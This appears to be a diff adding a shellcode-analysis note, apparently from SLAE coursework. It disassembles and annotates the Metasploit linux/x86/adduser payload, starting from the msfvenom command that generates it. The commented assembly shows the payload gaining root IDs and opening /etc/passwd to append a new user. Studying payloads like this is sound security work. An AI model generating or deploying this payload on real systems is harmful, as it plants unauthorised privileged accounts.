@@ -1,0 +1,48 @@
+$ msfvenom -p linux/x86/adduser -f raw PASS=slaepwd USER=slaeusr | ndisasm -u -k 43,37 -
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+00000000  31C9              xor ecx,ecx                 ;zero out ECX
+00000002  89CB              mov ebx,ecx                 ;zero out EBX
+00000004  6A46              push byte +0x46             ;push on stack 0x46 (70)
+00000006  58                pop eax                     ;pop from stack 0x46 into EAX
+00000007  CD80              int 0x80                    ;syscall setreuid (0,0)
+
+
+00000009  6A05              push byte +0x5              ;push 0x5 on stack
+0000000B  58                pop eax                     ;pop 0x5 from stack into EAX
+0000000C  31C9              xor ecx,ecx                 ;zero out ECX
+0000000E  51                push ecx                    ;push 0 on the stack
+0000000F  6873737764        push dword 0x64777373       ;push dwss on stack
+00000014  682F2F7061        push dword 0x61702f2f       ;push ap// on stack
+00000019  682F657463        push dword 0x6374652f       ;push cte/ on stack
+0000001E  89E3              mov ebx,esp                 ;EBX points to top of stack
+00000020  41                inc ecx                     ;ECX = 1
+00000021  B504              mov ch,0x4                  ;ECX = 0x401
+00000023  CD80              int 0x80                    ;syscall open(/etc//passwd, 401)
+                                                        ;we open the file with write perms
+
+00000025  93                xchg eax,ebx        	;store file descriptor from open() into EBX
+                                                	;EAX=previous value of EBX, i.e. stack pointer
+                                                	;from open()
+00000026  E825000000        call dword 0x50     	;jump to offset 0x50
+
+0000002B  skipping 0x25 bytes                   	;this section holds the line we want to
+                                                	;add into /etc/passwd
+
+00000050  59                pop ecx             	;ECX points to the point where we need to return
+                                                	;from the call above, effectively
+                                                	;at the start of the string
+00000051  8B51FC            mov edx,[ecx-0x4]   	;EDX = 0x25 (start of string - 4 bytes
+                                                	;points us to 0x25, effectively, this is the
+                                                	;LENGTH of the string we need to write)
+00000054  6A04              push byte +0x4      	;push 4 on stack
+00000056  58                pop eax             	;pop 4 from stack into EAX
+00000057  CD80              int 0x80            	;syscall write()
+                                                	;EBX, fd to write to
+                                                	;ECX, pointer to buffer containing the data
+                                                	;EDX, bytes count
+
+00000059  6A01              push byte +0x1      	;push 1 on stack
+0000005B  58                pop eax             	;pop 1 from stack into EAX
+0000005C  CD80              int 0x80            	;syscall exit()
